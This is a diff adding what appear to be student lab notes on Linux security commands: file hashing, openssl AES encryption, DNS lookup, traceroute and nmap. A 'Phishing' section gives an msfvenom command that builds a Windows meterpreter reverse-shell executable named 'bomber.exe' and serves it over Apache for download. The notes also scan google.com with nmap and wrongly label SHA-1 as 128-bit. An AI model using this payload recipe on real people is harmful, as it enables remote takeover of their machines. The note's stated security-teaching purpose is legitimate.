@@ -1,0 +1,64 @@
+
+Important commands:
+ifconfig
+nano
+cat
+
+------------------------------------------------------------------------------------------------------------------------
+
+SHA 512/256
+
+ - nano sample.txt			//create file
+
+ - cat sample.txt
+
+ - sha256sum sample.txt		//sha 256
+
+ - sha512sum sample.txt		//sha 512
+
+ - sha1sum sample.txt                 	//sha 128
+
+------------------------------------------------------------------------------------------------------------------------
+
+Phishing
+- sudo su
+- cd /var/www/html
+- mkdir daivik
+- cd daivik
+- msfvenom -p windows/meterpreter/reverse_tcp lhost=xxx lport=4443 -f exe -o /var/www/html/daivik/bomber.exe
+
+- sudo service apache2 start
+- also go to mozilla and pout xxxIP/daivik and download bomber.exe
+
+ -  then go to virus total and upload bomber.exe
+
+------------------------------------------------------------------------------------------------------------------------
+AES encrypt/decrypt
+types:
+aes-256-ecb 
+aes-256-cbc 
+aes-128-cbc
+==>
+openssl version
+nano msg
+cat msg
+openssl enc -aes-256-cbc -base64 -in msg -out enc1
+cat enc1
+openssl enc -aes-256-cbc -d -base64 -in enc1 -out dec1
+cat dec1
+
+------------------------------------------------------------------------------------------------------------------------
+
+Answer the below Questions:
+ Find out the IP address of the google.com.
+ Identify how many hops passed to reach the server google.com
+ Find out how many ports are open in the google.com
+
+nslookup google.com
+traceroute -n google.com
+sudo nmap google.com
+
+------------------------------------------------------------------------------------------------------------------------
+
+
+
